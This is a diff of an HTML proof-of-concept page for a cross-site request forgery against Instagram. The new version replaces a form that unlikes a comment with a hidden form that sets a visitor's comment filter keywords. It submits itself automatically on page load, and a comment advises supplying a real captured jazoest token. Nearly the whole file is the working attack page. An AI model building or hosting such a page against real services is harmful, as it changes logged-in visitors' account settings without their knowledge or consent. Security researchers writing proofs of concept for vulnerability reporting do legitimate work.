@@ -1,16 +1,22 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<body>
-<h2>CSRF Test</h2>
+  <head><meta charset="utf-8"><title>CSRF PoC - Set Comment Filter Keywords</title></head>
+  <body>
+    <h3>CSRF PoC - Set Comment Filter Keywords (auto-submit)</h3>
 
-<form action="https://www.instagram.com/api/v1/web/comments/unlike/18062636915022715/" method="POST">
-  <input type="submit" value="Send CSRF Test">
-</form>
+    <form id="f" action="https://www.instagram.com/api/v1/accounts/set_comment_filter_keywords/" method="POST" enctype="application/x-www-form-urlencoded" target="_blank">
+      <!-- Example keywords; URL-encoding handled by browser -->
+      <input type="hidden" name="keywords" value="testword1, testword2">
+      <!-- jazoest value: try with a real captured value from a legitimate request, or try dummy to test server behavior -->
+      <input type="hidden" name="jazoest" value="1">
+      <input type="submit" value="Send CSRF Test">
+    </form>
 
-<!-- Optional: auto-submit on load -->
-<script>
-document.forms[0].submit();
-</script>
-
-</body>
+    <script>
+      // Auto-submit
+      window.addEventListener('load', function(){
+        setTimeout(function(){ document.getElementById('f').submit(); }, 250);
+      });
+    </script>
+  </body>
 </html>
